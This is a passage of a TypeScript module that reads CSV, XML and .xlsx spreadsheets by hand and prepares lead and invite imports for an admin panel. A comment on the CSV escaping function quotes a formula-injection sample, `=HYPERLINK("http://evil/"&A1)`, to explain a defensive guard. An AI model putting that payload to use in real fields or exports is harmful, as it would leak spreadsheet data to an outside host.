/**
 * dataImport.ts
 *
 * Reading a spreadsheet an owner already has, with no library.
 *
 * The site ships three dependencies and keeps it that way, so there is no
 * SheetJS and no papaparse here. What there is instead:
 *
 *   CSV                 hand-written RFC 4180 reader, undoing exactly the
 *                       escaping `settingsExport.csvCell` writes.
 *   .xls (our template) SpreadsheetML 2003, which is plain XML that Excel,
 *                       Numbers and LibreOffice all open natively. We write it,
 *                       so we can read it back.
 *   .xlsx               a ZIP of XML. The central directory is read by hand and
 *                       the entries inflated with `DecompressionStream`, which
 *                       every browser this site supports has had since 2023.
 *
 * That last one has limits, and they are real. It reads the FIRST worksheet, it
 * has no idea what a cell's number format is (an Excel date arrives as the
 * serial number Excel stores), and a Zip64 archive or an encrypted workbook is
 * refused rather than half-read. A legacy binary .xls (the pre-2007 BIFF
 * format, not our XML one) is refused outright: parsing it is a project, not a
 * function. Every one of those paths returns the same sentence telling the
 * person to save the file as CSV in Excel and try again, because that always
 * works and takes them ten seconds.
 *
 * NOTHING HERE THROWS. Every failure is a value with a sentence in it, because
 * every caller is a screen that has to say something. And nothing here writes
 * until a person presses the button: parsing, mapping and validating are pure
 * and separate from `importLeads` / `sendBulkInvites` on purpose, so the panel
 * can show an honest preview of what is about to happen.
 *
 * Two importable kinds, and only two:
 *   leads    applications, which is a plain admin-only INSERT.
 *   invites  people, which is NOT an insert. `profiles.id` is a foreign key to
 *            `auth.users`, so an account cannot be conjured from a spreadsheet.
 *            Importing people means sending each of them an invitation, and
 *            that EMAILS them, which the panel says out loud before the button.
 *
 * Bookings are deliberately absent. Creating one fires the triggers from 007
 * that push the event to Google Calendar, so a bad import would not just dirty
 * a table, it would put fifty wrong appointments on a coach's real calendar.
 */

// Extensions on purpose. The pure half of this file is unit-tested by
// `node --test`, which resolves ESM specifiers literally, so everything loaded
// at module scope has to name itself exactly. Anything that cannot (the
// invitation and people modules, which reach further into the app) is imported
// where it is used instead, further down.
import { supabase, supabaseConfigured } from './supabase.ts'
import { DEMO_LEADS } from '../data/demoData.ts'
import { sanitizeText, sanitizeEmail, isValidEmail } from '../utils/sanitize.ts'

export type ImportKind = 'leads' | 'invites'

export interface ParsedTable {
  headers: string[]
  rows: string[][]
}

export type ParseOutcome =
  | { ok: true; table: ParsedTable }
  | { ok: false; message: string }

const offline = (isDemo: boolean) => isDemo || !supabaseConfigured

/** A beat of latency so a demo commit reads as honest work, not an instant no. */
const beat = () => new Promise<void>(r => setTimeout(r, 240))

/** The header is spreadsheet row 1, so a problem with the columns belongs to it. */
const HEADER_ROW = 1

/** Longer than any answer on the application form, short enough to stop a paste accident. */
const VALUE_MAX = 2000

/** Past this it is a migration, not an import, and it should be split up. */
const MAX_ROWS = 2000

/** Bigger than any spreadsheet of contacts, small enough to not hang a tab. */
const MAX_FILE_BYTES = 8 * 1024 * 1024

/**
 * The one sentence every unreadable file ends at.
 *
 * It names the way out rather than the problem, because "Zip64 end of central
 * directory" is true and useless, and "save it as CSV" is what actually gets
 * the owner's data in.
 */
const SAVE_AS_CSV =
  'Open the file in Excel, choose Save As, pick CSV, and upload that instead. It takes a few seconds and always works.'

export const IMPORT_ACCEPT = [
  '.csv', '.xls', '.xlsx',
  'text/csv',
  // A Windows machine with Excel installed reports a CSV as this, so leaving it
  // out greys out the file the owner is trying to pick. Same trap as
  // resourceFiles.ts documents for attachments.
  'application/vnd.ms-excel',
  'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
].join(',')

// ═══════════════════════════════════════════════════════════════════════════
// CSV
// ═══════════════════════════════════════════════════════════════════════════

/**
 * One CSV cell, escaped for the file format AND the spreadsheet that opens it.
 *
 * This used to live in `settingsExport.ts`, which is where it is still used
 * from. It moved here because the reader below has to undo EXACTLY this and
 * nothing else, and a writer and a reader of the same escaping that sit in two
 * files drift the moment one of them is edited.
 *
 * Two escapes. A quote is doubled, so a value containing one cannot end its own
 * field and shift every column after it. And a value starting with `=`, `+`,
 * `-` or `@` gets a leading apostrophe, because otherwise it is a FORMULA to
 * Excel and Sheets: an applicant who types `=HYPERLINK("http://evil/"&A1)` into
 * a name field gets it executed on the admin's machine when they open the
 * export. The apostrophe makes the spreadsheet treat it as the text it always
 * was.
 */
export function csvCell(value: unknown): string {
  const raw = String(value ?? '')
  const escaped = /^[=+\-@\t\r]/.test(raw) ? `'${raw}` : raw
  return `"${escaped.replace(/"/g, '""')}"`
}

/** A whole CSV. An empty `rows` gives back the header alone, which is a template. */
export function toCsv(headers: string[], rows: (unknown[])[]): string {
  const head = headers.map(csvCell).join(',')
  const body = rows.map(r => r.map(csvCell).join(',')).join('\n')
  return body ? `${head}\n${body}` : head
}

/**
 * RFC 4180, plus the two things our own exports do to a cell.
 *
 * A quote inside a quoted field is doubled, and a value that started with `=`,
 * `+`, `-` or `@` was given a leading apostrophe so Excel would not run it as a
 * formula. Both are undone here, and the apostrophe is only removed when the
 * character after it is one of those four, so a name like `'Tis` survives.
 *
 * Line endings are whatever the file has. Excel on Windows writes CRLF, Excel on
 * a Mac writes LF, and a file that has been through both has a mixture.
 */
export function parseCsv(text: string): ParseOutcome {
  const src = text.replace(/^﻿/, '')
  const rows: string[][] = []
  let row: string[] = []
  let cell = ''
  let quoted = false
  let i = 0

  const endCell = () => { row.push(unguard(cell)); cell = '' }
  const endRow = () => { endCell(); rows.push(row); row = [] }

  while (i < src.length) {
    const ch = src[i]

    if (quoted) {
      if (ch === '"') {
        if (src[i + 1] === '"') { cell += '"'; i += 2; continue }
        quoted = false; i++; continue
      }
      cell += ch; i++; continue
    }

    if (ch === '"' && cell === '') { quoted = true; i++; continue }
    if (ch === ',') { endCell(); i++; continue }
    if (ch === '\r') { endRow(); if (src[i + 1] === '\n') i += 2; else i++; continue }
    if (ch === '\n') { endRow(); i++; continue }
    cell += ch; i++
  }

  // A file ending in a newline has already closed its last row; anything left in
  // hand is a final row without a terminator.
  if (cell !== '' || row.length > 0 || quoted) endRow()

  if (quoted) {
    return {
      ok: false,
      message: 'That CSV has a quote that is never closed, so the columns cannot be told apart. Check for a stray " and try again.',
    }
  }

  return tableFrom(rows)
}

/** Undo the formula guard `csvCell` adds, and nothing else. */
function unguard(cell: string): string {
  return cell.length > 1 && cell[0] === "'" && /[=+\-@\t\r]/.test(cell[1]) ? cell.slice(1) : cell
}

// ═══════════════════════════════════════════════════════════════════════════
// A very small XML reader
// ═══════════════════════════════════════════════════════════════════════════

/**
 * Both spreadsheet formats are XML underneath, so both go through one tiny tree.
 *
 * In a browser that tree is built by `DOMParser`, which is the right tool and
 * costs nothing. Node has no `DOMParser`, and the pure parsing here is exactly
 * what the tests need to be able to run, so there is a hand-written scanner
 * behind it. Both produce the same `XNode`, and everything downstream is written
 * once against that, so the two paths cannot drift in how a sheet is read: they
 * differ only in how the angle brackets are counted.
 */
interface XNode {
  /** Local name, namespace prefix stripped, so `ss:Data` and `Data` are one thing. */
  name: string
  /** Keyed by local attribute name, for the same reason. */
  attrs: Record<string, string>
  /** This element's own text, entities decoded. Descendants keep theirs. */
  text: string
  children: XNode[]
}

const localName = (n: string) => {
  const i = n.indexOf(':')
  return i < 0 ? n : n.slice(i + 1)
}

function decodeEntities(s: string): string {
  if (!s.includes('&')) return s
  return s.replace(/&(#[0-9]+|#[xX][0-9a-fA-F]+|[a-zA-Z]+);/g, (whole, body: string) => {
    if (body[0] === '#') {
      const code = body[1] === 'x' || body[1] === 'X'
        ? parseInt(body.slice(2), 16)
        : parseInt(body.slice(1), 10)
      if (!Number.isFinite(code) || code <= 0 || code > 0x10ffff) return whole
      try { return String.fromCodePoint(code) } catch { return whole }
    }
    switch (body) {
      case 'lt':   return '<'
      case 'gt':   return '>'
      case 'amp':  return '&'
      case 'quot': return '"'
      case 'apos': return "'"
      default:     return whole
    }
  })
}

/** The `>` that closes this tag, skipping any inside an attribute value. */
function tagEnd(text: string, from: number): number {
  let quote = ''
  for (let i = from + 1; i < text.length; i++) {
    const ch = text[i]
    if (quote) { if (ch === quote) quote = ''; continue }
    if (ch === '"' || ch === "'") { quote = ch; continue }
    if (ch === '>') return i
  }
  return -1
}

const ATTR_RE = /([A-Za-z_:][-\w.:]*)\s*=\s*("([^"]*)"|'([^']*)')/g

function openTag(body: string): XNode | null {
  const m = /^([A-Za-z_:][-\w.:]*)/.exec(body)
  if (!m) return null
  const attrs: Record<string, string> = {}
  ATTR_RE.lastIndex = m[0].length
  let a: RegExpExecArray | null
  while ((a = ATTR_RE.exec(body)) !== null) {
    attrs[localName(a[1])] = decodeEntities(a[3] ?? a[4] ?? '')
  }
  return { name: localName(m[1]), attrs, text: '', children: [] }
}

/** The fallback tree builder. Returns null on anything it cannot make sense of. */
function scanXml(text: string): XNode | null {
  const doc: XNode = { name: '#document', attrs: {}, text: '', children: [] }
  const stack: XNode[] = [doc]
  let i = 0

  while (i < text.length) {
    const top = stack[stack.length - 1]
    const lt = text.indexOf('<', i)
    if (lt < 0) { top.text += decodeEntities(text.slice(i)); break }
    if (lt > i) top.text += decodeEntities(text.slice(i, lt))

    if (text.startsWith('<!--', lt)) {
      const end = text.indexOf('-->', lt)
      if (end < 0) return null
      i = end + 3; continue
    }
    if (text.startsWith('<![CDATA[', lt)) {
      const end = text.indexOf(']]>', lt)
      if (end < 0) return null
      top.text += text.slice(lt + 9, end)
      i = end + 3; continue
    }
    if (text.startsWith('<?', lt)) {
      const end = text.indexOf('?>', lt)
      if (end < 0) return null
      i = end + 2; continue
    }
    if (text.startsWith('<!', lt)) {
      const end = tagEnd(text, lt)
      if (end < 0) return null
      i = end + 1; continue
    }

    const gt = tagEnd(text, lt)
    if (gt < 0) return null
    const inner = text.slice(lt + 1, gt)

    if (inner[0] === '/') {
      if (stack.length <= 1) return null
      stack.pop()
      i = gt + 1; continue
    }

    const selfClosing = inner.endsWith('/')
    const node = openTag(selfClosing ? inner.slice(0, -1) : inner)
    if (!node) return null
    top.children.push(node)
    if (!selfClosing) stack.push(node)
    i = gt + 1
  }

  if (stack.length !== 1) return null
  return doc.children[0] ?? null
}

function fromDom(el: Element): XNode {
  const attrs: Record<string, string> = {}
  for (let i = 0; i < el.attributes.length; i++) {
    const a = el.attributes[i]
    attrs[a.localName || a.name] = a.value
  }
  let text = ''
  const children: XNode[] = []
  for (let i = 0; i < el.childNodes.length; i++) {
    const n = el.childNodes[i]
    if (n.nodeType === 3 || n.nodeType === 4) text += n.nodeValue ?? ''
    else if (n.nodeType === 1) children.push(fromDom(n as Element))
  }
  return { name: el.localName || el.nodeName, attrs, text, children }
}

function parseXml(text: string): XNode | null {
  if (typeof DOMParser !== 'undefined') {
    try {
      const doc = new DOMParser().parseFromString(text, 'application/xml')
      const root = doc.documentElement
      // A malformed document does not throw, it comes back as a document whose
      // root (or first child) is a `parsererror` element. Both shapes exist
      // across browsers, so check for either.
      if (!root) return null
      if (root.nodeName === 'parsererror' || root.getElementsByTagName('parsererror').length > 0) return null
      return fromDom(root)
    } catch {
      return null
    }
  }
  return scanXml(text)
}

const kids = (node: XNode, name: string) => node.children.filter(c => c.name === name)

function firstNamed(node: XNode, name: string): XNode | null {
  for (const c of node.children) if (c.name === name) return c
  return null
}

function findDescendant(node: XNode, name: string): XNode | null {
  if (node.name === name) return node
  for (const c of node.children) {
    const hit = findDescendant(c, name)
    if (hit) return hit
  }
  return null
}

/** This element's text and every descendant's, in order. Rich-text runs join up. */
function deepText(node: XNode | null): string {
  if (!node) return ''
  let out = node.text
  for (const c of node.children) out += deepText(c)
  return out
}

// ═══════════════════════════════════════════════════════════════════════════
// SpreadsheetML 2003 (our own .xls template)
// ═══════════════════════════════════════════════════════════════════════════

/**
 * The format `templateSpreadsheetXml` writes, so the template round-trips.
 *
 * Excel also writes it from Save As, "XML Spreadsheet 2003", which is the other
 * reason to read it: it is the one non-CSV format an owner can produce that is
 * plain text.
 *
 * `ss:Index` on a cell is the only fiddly part. A sheet with a gap writes the
 * next cell's column position rather than an empty cell, so a row has to be
 * placed by index, not by order.
 */
export function parseSpreadsheetXml(text: string): ParseOutcome {
  const root = parseXml(text)
  if (!root) {
    return { ok: false, message: `That file is not readable as a spreadsheet. ${SAVE_AS_CSV}` }
  }

  const worksheet = findDescendant(root, 'Worksheet')
  const table = worksheet ? findDescendant(worksheet, 'Table') : findDescendant(root, 'Table')
  if (!table) {
    return { ok: false, message: `That XML file has no worksheet in it. ${SAVE_AS_CSV}` }
  }

  const rows: string[][] = []
  for (const r of kids(table, 'Row')) {
    const cells: string[] = []
    let col = 0
    for (const c of kids(r, 'Cell')) {
      const index = parseInt(c.attrs.Index ?? '', 10)
      if (Number.isFinite(index) && index >= 1) col = index - 1
      while (cells.length < col) cells.push('')
      const data = firstNamed(c, 'Data')
      cells[col] = deepText(data ?? c).trim()
      col++
    }
    rows.push(cells)
  }

  return tableFrom(rows)
}

// ═══════════════════════════════════════════════════════════════════════════
// .xlsx — a ZIP of XML
// ═══════════════════════════════════════════════════════════════════════════

const ZIP_LOCAL   = 0x04034b50
const ZIP_CENTRAL = 0x02014b50
const ZIP_EOCD    = 0x06054b50

interface ZipEntry { method: number; compressedSize: number; localOffset: number }

/** The end-of-central-directory record, scanned backwards past any trailing comment. */
function findEocd(view: DataView): number {
  const max = Math.min(view.byteLength, 0xffff + 22)
  for (let back = 22; back <= max; back++) {
    const at = view.byteLength - back
    if (at < 0) break
    if (view.getUint32(at, true) === ZIP_EOCD) return at
  }
  return -1
}

function readCentralDirectory(bytes: Uint8Array, view: DataView): Map<string, ZipEntry> | null {
  const eocd = findEocd(view)
  if (eocd < 0) return null

  const count  = view.getUint16(eocd + 10, true)
  const offset = view.getUint32(eocd + 16, true)
  // Zip64 parks these at their maximum and puts the real values in a separate
  // record. Nothing Excel writes for a normal workbook needs it, so rather than
  // implement a second directory format this refuses and points at CSV.
  if (count === 0xffff || offset === 0xffffffff) return null

  const entries = new Map<string, ZipEntry>()
  const decoder = new TextDecoder('utf-8')
  let p = offset

  for (let i = 0; i < count; i++) {
    if (p + 46 > bytes.length) return null
    if (view.getUint32(p, true) !== ZIP_CENTRAL) return null
    const method     = view.getUint16(p + 10, true)
    // The CENTRAL sizes, never the local ones: an entry written with a data
    // descriptor carries zeroes in its local header and the truth only here.
    const compressed = view.getUint32(p + 20, true)
    const nameLen    = view.getUint16(p + 28, true)
    const extraLen   = view.getUint16(p + 30, true)
    const commentLen = view.getUint16(p + 32, true)
    const localOff   = view.getUint32(p + 42, true)
    const name = decoder.decode(bytes.subarray(p + 46, p + 46 + nameLen))
    entries.set(name, { method, compressedSize: compressed, localOffset: localOff })
    p += 46 + nameLen + extraLen + commentLen
  }

  return entries
}

async function inflateRaw(bytes: Uint8Array): Promise<Uint8Array | null> {
  if (typeof DecompressionStream === 'undefined') return null
  try {
    const stream = new Blob([bytes as unknown as BlobPart]).stream().pipeThrough(new DecompressionStream('deflate-raw'))
    return new Uint8Array(await new Response(stream).arrayBuffer())
  } catch {
    return null
  }
}

async function readZipEntry(
  bytes: Uint8Array,
  view: DataView,
  entry: ZipEntry,
): Promise<string | null> {
  const at = entry.localOffset
  if (at + 30 > bytes.length) return null
  if (view.getUint32(at, true) !== ZIP_LOCAL) return null
  // The local header's extra field is allowed to differ in length from the
  // central one, so it has to be read here rather than reused.
  const nameLen  = view.getUint16(at + 26, true)
  const extraLen = view.getUint16(at + 28, true)
  const start = at + 30 + nameLen + extraLen
  const raw = bytes.subarray(start, start + entry.compressedSize)

  let plain: Uint8Array | null
  if (entry.method === 0) plain = raw
  else if (entry.method === 8) plain = await inflateRaw(raw)
  else plain = null

  if (!plain) return null
  return new TextDecoder('utf-8').decode(plain)
}

const OLE_SIGNATURE = [0xd0, 0xcf, 0x11, 0xe0]

function looksLikeLegacyXls(bytes: Uint8Array): boolean {
  return OLE_SIGNATURE.every((b, i) => bytes[i] === b)
}

/** `A` is 1, `AB` is 28. The letters in a cell reference are its column. */
function columnFromRef(ref: string): number {
  let n = 0
  for (const ch of ref) {
    const code = ch.charCodeAt(0)
    if (code >= 65 && code <= 90) n = n * 26 + (code - 64)
    else if (code >= 97 && code <= 122) n = n * 26 + (code - 96)
    else break
  }
  return n
}

function sharedStringsFrom(xml: string | null): string[] {
  if (!xml) return []
  const root = parseXml(xml)
  if (!root) return []
  return kids(root, 'si').map(si => deepText(si))
}

function rowsFromSheet(xml: string, shared: string[]): string[][] | null {
  const root = parseXml(xml)
  if (!root) return null
  const sheetData = findDescendant(root, 'sheetData')
  if (!sheetData) return null

  const rows: string[][] = []
  for (const r of kids(sheetData, 'row')) {
    const cells: string[] = []
    let col = 0
    for (const c of kids(r, 'c')) {
      const ref = c.attrs.r ?? ''
      const at = ref ? columnFromRef(ref) - 1 : col
      if (at >= 0) col = at
      while (cells.length < col) cells.push('')

      const type = c.attrs.t ?? ''
      let value: string
      if (type === 's') {
        const idx = parseInt(deepText(firstNamed(c, 'v')), 10)
        value = Number.isFinite(idx) ? (shared[idx] ?? '') : ''
      } else if (type === 'inlineStr') {
        value = deepText(firstNamed(c, 'is'))
      } else if (type === 'b') {
        value = deepText(firstNamed(c, 'v')).trim() === '1' ? 'TRUE' : 'FALSE'
      } else if (type === 'e') {
        // A cell holding #N/A is an empty answer, not the text "#N/A".
        value = ''
      } else {
        value = deepText(firstNamed(c, 'v'))
      }

      cells[col] = value.trim()
      col++
    }
    rows.push(cells)
  }
  return rows
}

/**
 * Read the first worksheet out of an .xlsx.
 *
 * What it does NOT do, all of it deliberate: it ignores styles, so a cell Excel
 * displays as a date arrives as the number Excel stores underneath; it reads
 * one sheet; and it refuses Zip64, encryption, and anything compressed with
 * something other than deflate. Each refusal names CSV as the way through.
 */
export async function parseXlsx(buffer: ArrayBuffer): Promise<ParseOutcome> {
  const bytes = new Uint8Array(buffer)

  if (looksLikeLegacyXls(bytes)) {
    return {
      ok: false,
      message: `That is an older Excel file (the pre-2007 .xls format), which this cannot read. ${SAVE_AS_CSV}`,
    }
  }
  if (!(bytes[0] === 0x50 && bytes[1] === 0x4b)) {
    return { ok: false, message: `That file is not a spreadsheet this can read. ${SAVE_AS_CSV}` }
  }
  if (typeof DecompressionStream === 'undefined') {
    return {
      ok: false,
      message: `This browser cannot unpack an Excel file. ${SAVE_AS_CSV}`,
    }
  }

  const view = new DataView(buffer)
  const entries = readCentralDirectory(bytes, view)
  if (!entries) {
    return { ok: false, message: `That Excel file could not be unpacked. ${SAVE_AS_CSV}` }
  }
  // An encrypted workbook is a valid ZIP holding an OLE container instead of the
  // xl/ tree, which is why this is checked by what is inside rather than a flag.
  if (entries.has('EncryptedPackage')) {
    return {
      ok: false,
      message: `That workbook is password protected. Remove the password, or ${SAVE_AS_CSV[0].toLowerCase()}${SAVE_AS_CSV.slice(1)}`,
    }
  }

  // `sheet1.xml` is what Excel writes for a plain workbook. A file that has had
  // sheets added and deleted can start at a different number, so fall back to
  // the lowest one there is (numerically, so sheet2 beats sheet10). Which sheet
  // is FIRST in the tabs is recorded in xl/workbook.xml, not the filename, and
  // this does not read that: a multi-sheet workbook is one of the cases the
  // save-as-CSV sentence exists for.
  const sheetName = entries.has('xl/worksheets/sheet1.xml')
    ? 'xl/worksheets/sheet1.xml'
    : [...entries.keys()]
        .filter(n => /^xl\/worksheets\/sheet\d+\.xml$/.test(n))
        .sort((a, b) => parseInt(a.replace(/\D+/g, ''), 10) - parseInt(b.replace(/\D+/g, ''), 10))[0]

  const sheetEntry = sheetName ? entries.get(sheetName) : undefined
  if (!sheetEntry) {
    return { ok: false, message: `That Excel file has no worksheet in it. ${SAVE_AS_CSV}` }
  }

  const sheetXml = await readZipEntry(bytes, view, sheetEntry)
  if (!sheetXml) {
    return { ok: false, message: `That Excel file could not be unpacked. ${SAVE_AS_CSV}` }
  }

  const stringsEntry = entries.get('xl/sharedStrings.xml')
  const stringsXml = stringsEntry ? await readZipEntry(bytes, view, stringsEntry) : null

  const rows = rowsFromSheet(sheetXml, sharedStringsFrom(stringsXml))
  if (!rows) {
    return { ok: false, message: `That worksheet could not be read. ${SAVE_AS_CSV}` }
  }

  return tableFrom(rows)
}

// ═══════════════════════════════════════════════════════════════════════════
// Routing
// ═══════════════════════════════════════════════════════════════════════════

/**
 * Extension first, then what the bytes actually say.
 *
 * The extension is a hint, not a fact. A file called `.xls` from a modern Excel
 * is often really an .xlsx, and one saved from a web tool is often really a CSV
 * with the wrong name on it. Sniffing the first bytes costs nothing and saves an
 * owner from a refusal that is not their fault.
 */
export async function parseTableFile(file: File): Promise<ParseOutcome> {
  if (file.size === 0) {
    return { ok: false, message: 'That file is empty. Check you picked the right one and try again.' }
  }
  if (file.size > MAX_FILE_BYTES) {
    return {
      ok: false,
      message: `That file is over ${Math.round(MAX_FILE_BYTES / (1024 * 1024))} MB, which is far bigger than a list of people. Split it up and import a piece at a time.`,
    }
  }

  let buffer: ArrayBuffer
  try {
    buffer = await file.arrayBuffer()
  } catch {
    return { ok: false, message: 'That file could not be read off the disk. Try picking it again.' }
  }

  const bytes = new Uint8Array(buffer)
  const name = file.name.toLowerCase()

  if (bytes[0] === 0x50 && bytes[1] === 0x4b) return parseXlsx(buffer)
  if (looksLikeLegacyXls(bytes)) {
    return {
      ok: false,
      message: `That is an older Excel file (the pre-2007 .xls format), which this cannot read. ${SAVE_AS_CSV}`,
    }
  }

  const text = new TextDecoder('utf-8').decode(bytes)
  const head = text.slice(0, 400).trimStart()
  if (head.startsWith('<?xml') || head.startsWith('<Workbook') || /^<\?mso-application/.test(head)) {
    return parseSpreadsheetXml(text)
  }
  if (name.endsWith('.xlsx')) {
    return { ok: false, message: `That file says .xlsx but is not one. ${SAVE_AS_CSV}` }
  }
  return parseCsv(text)
}

/** Trim the trailing blank rows every spreadsheet export leaves, then split off the header. */
function tableFrom(rows: string[][]): ParseOutcome {
  const blank = (r: string[]) => r.every(c => !c || !c.trim())
  let end = rows.length
  while (end > 0 && blank(rows[end - 1])) end--
  const kept = rows.slice(0, end)

  if (kept.length === 0) {
    return { ok: false, message: 'That file has nothing in it. Check you picked the right one and try again.' }
  }
  if (kept.length - 1 > MAX_ROWS) {
    return {
      ok: false,
      message: `That file has more than ${MAX_ROWS} rows. Split it into smaller files and import them one at a time.`,
    }
  }

  const headers = kept[0].map(h => (h ?? '').trim())
  if (headers.every(h => !h)) {
    return {
      ok: false,
      message: 'The first row of that file is blank, and it needs to be the column names. Download a template to see the shape.',
    }
  }

  return { ok: true, table: { headers, rows: kept.slice(1) } }
}

// ═══════════════════════════════════════════════════════════════════════════
// Columns
// ═══════════════════════════════════════════════════════════════════════════

export interface RowIssue { row: number; message: string }

/**
 * Every `leads` column an import may fill.
 *
 * The four required ones are the four the table declares NOT NULL with no
 * default. `status` is absent on purpose: 013 sends an invitation on an UPDATE
 * to status, never an INSERT, so a row imported as 'accepted' would sit there
 * looking accepted with nobody invited. Every import starts at 'new' and goes
 * through the same review as an application from the website.
 *
 * `admin_notes` is absent too. Staff notes are written by staff.
 */
export const LEAD_FIELDS: Array<{ column: string; header: string; required: boolean; hint?: string }> = [
  { column: 'first_name',      header: 'First name',        required: true },
  { column: 'last_name',       header: 'Last name',         required: true },
  { column: 'email',           header: 'Email',             required: true, hint: 'One per person. A repeat of an address already on file is flagged before anything is written.' },
  { column: 'service',         header: 'Service',           required: true, hint: 'What they are asking for, in your own words.' },
  { column: 'coach_pref',      header: 'Coach preference',  required: false, hint: 'Leave blank and it records as No Preference.' },
  { column: 'social',          header: 'Social',            required: false },
  { column: 'age',             header: 'Age',               required: false },
  { column: 'height',          header: 'Height',            required: false },
  { column: 'body_weight',     header: 'Body weight',       required: false },
  { column: 'weight_class',    header: 'Weight class',      required: false },
  { column: 'experience',      header: 'Experience',        required: false },
  { column: 'injuries',        header: 'Injuries',          required: false },
  { column: 'train_days',      header: 'Training days',     required: false },
  { column: 'occupation',      header: 'Occupation',        required: false },
  { column: 'squat_max',       header: 'Squat max',         required: false },
  { column: 'squat_freq',      header: 'Squat frequency',   required: false },
  { column: 'squat_style',     header: 'Squat style',       required: false },
  { column: 'bench_max',       header: 'Bench max',         required: false },
  { column: 'bench_freq',      header: 'Bench frequency',   required: false },
  { column: 'bench_style',     header: 'Bench style',       required: false },
  { column: 'dead_max',        header: 'Deadlift max',      required: false },
  { column: 'dead_freq',       header: 'Deadlift frequency', required: false },
  { column: 'dead_style',      header: 'Deadlift style',    required: false },
  { column: 'current_program', header: 'Current program',   required: false },
  { column: 'weak_points',     header: 'Weak points',       required: false },
  { column: 'learning_style',  header: 'Learning style',    required: false },
  { column: 'sleep',           header: 'Sleep',             required: false },
  { column: 'nutrition',       header: 'Nutrition',         required: false },
  { column: 'stress',          header: 'Stress',            required: false },
  { column: 'recovery',        header: 'Recovery',          required: false },
  { column: 'expectations',    header: 'Expectations',      required: false },
  { column: 'goals',           header: 'Goals',             required: false },
]

export const INVITE_FIELDS: Array<{ column: string; header: string; required: boolean }> = [
  { column: 'email',      header: 'Email',      required: true },
  { column: 'first_name', header: 'First name', required: false },
  { column: 'last_name',  header: 'Last name',  required: false },
]

/** Header text to a comparable key. Case, spaces, punctuation and underscores all go. */
const norm = (s: string) => s.toLowerCase().replace(/[^a-z0-9]+/g, '')

/**
 * The other things people call these columns.
 *
 * A spreadsheet an owner already keeps was not named after our schema, and
 * making them rename a column before we will read it is the kind of friction
 * that ends with the import never being used.
 */
const EXTRA_ALIASES: Record<string, string[]> = {
  first_name:  ['first', 'firstname', 'givenname', 'fname', 'forename'],
  last_name:   ['last', 'lastname', 'surname', 'familyname', 'lname'],
  email:       ['mail', 'emailaddress', 'contactemail'],
  service:     ['program', 'package', 'interest', 'serviceinterest', 'servicerequested', 'plan'],
  coach_pref:  ['coach', 'preferredcoach', 'coachpreference', 'coachrequested'],
  social:      ['instagram', 'ig', 'socialmedia', 'handle', 'socials'],
  body_weight: ['weight', 'bodyweightlbs'],
  train_days:  ['trainingdaysperweek', 'daysperweek', 'trainingdays'],
  squat_max:   ['squat', 'squat1rm'],
  bench_max:   ['bench', 'bench1rm'],
  dead_max:    ['deadlift', 'deadlift1rm', 'dl'],
  goals:       ['goal', 'objectives'],
  /** Not a column. `prepareInvites` splits it when there is no first name. */
  full_name:   ['name', 'fullname'],
}

/**
 * Columns we recognise and deliberately do not import.
 *
 * Listing them keeps the preview quiet about the file an owner most likely has,
 * which is the export they took out of this same panel five minutes ago.
 */
const IGNORED_HEADERS = new Set([
  'id', 'status', 'applied', 'appliedon', 'created', 'createdat', 'date', 'timestamp',
  'adminnotes', 'notes', 'joined', 'phone', 'role',
])

function aliasIndex(fields: Array<{ column: string; header: string }>): Map<string, string> {
  const index = new Map<string, string>()
  for (const f of fields) {
    index.set(norm(f.column), f.column)
    index.set(norm(f.header), f.column)
  }
  for (const [column, names] of Object.entries(EXTRA_ALIASES)) {
    for (const n of names) if (!index.has(n)) index.set(n, column)
  }
  return index
}

const LEAD_INDEX = aliasIndex(LEAD_FIELDS)
const INVITE_INDEX = aliasIndex(INVITE_FIELDS)

/**
 * Header row to column positions, complaining about row 1 as it goes.
 *
 * Everything it has to say lands on spreadsheet row 1, because that is where the
 * headers are and pointing at the actual row is the whole point of the preview.
 */
function mapHeaders(headers: string[], index: Map<string, string>, issues: RowIssue[]): Map<string, number> {
  const map = new Map<string, number>()
  const unknown: string[] = []
  let sawStatus = false

  headers.forEach((raw, i) => {
    const key = norm(raw)
    if (!key) return
    if (key === 'status') sawStatus = true
    const column = index.get(key)
    if (!column) {
      if (!IGNORED_HEADERS.has(key)) unknown.push(raw)
      return
    }
    if (map.has(column)) {
      issues.push({ row: HEADER_ROW, message: `There are two "${raw}" columns. The first one was used.` })
      return
    }
    map.set(column, i)
  })

  if (sawStatus) {
    issues.push({ row: HEADER_ROW, message: 'The Status column was ignored. Every imported application starts as New so it goes through the same review as one from the website.' })
  }
  if (unknown.length > 0) {
    issues.push({
      row: HEADER_ROW,
      message: `${unknown.length === 1 ? 'This column was' : 'These columns were'} not recognised and will be ignored: ${unknown.slice(0, 8).join(', ')}${unknown.length > 8 ? `, and ${unknown.length - 8} more` : ''}.`,
    })
  }

  return map
}

function missingColumnMessage(missing: Array<{ header: string }>): string {
  const names = missing.map(m => `"${m.header}"`)
  const list = names.length === 1
    ? names[0]
    : `${names.slice(0, -1).join(', ')} and ${names[names.length - 1]}`
  return `The file has no ${list} column, and ${names.length === 1 ? 'that one is' : 'those are'} required. Download a template to see the columns, or rename yours to match.`
}

function sentenceList(parts: string[]): string {
  if (parts.length === 1) return parts[0]
  return `${parts.slice(0, -1).join(', ')} and ${parts[parts.length - 1]}`
}

const lower = (set: Set<string>) => new Set([...set].map(e => e.trim().toLowerCase()).filter(Boolean))

const isBlankRow = (cells: string[]) => cells.every(c => !c || !c.trim())

// ═══════════════════════════════════════════════════════════════════════════
// Preparing rows (pure)
// ═══════════════════════════════════════════════════════════════════════════

export interface LeadDraft {
  first_name: string
  last_name: string
  email: string
  service: string
  [k: string]: string
}

export interface PreparedLeads {
  rows: LeadDraft[]
  issues: RowIssue[]
  /**
   * Addresses in `rows` that are already on file. The rows are STILL here: the
   * panel skips them by default and offers a checkbox, because "import it
   * anyway" is a real answer when the first application was two years ago.
   */
  duplicateEmails: string[]
}

/**
 * A parsed table to rows the `leads` table would accept, and a list of what is
 * wrong with the rest.
 *
 * Pure, and separate from the write on purpose. Nothing an owner uploads should
 * reach the database before they have read what it says.
 */
export function prepareLeads(table: ParsedTable, existing: Set<string>): PreparedLeads {
  const issues: RowIssue[] = []
  const map = mapHeaders(table.headers, LEAD_INDEX, issues)

  const missing = LEAD_FIELDS.filter(f => f.required && !map.has(f.column))
  if (missing.length > 0) {
    issues.push({ row: HEADER_ROW, message: missingColumnMessage(missing) })
    return { rows: [], issues, duplicateEmails: [] }
  }

  const taken = lower(existing)
  const seen = new Set<string>()
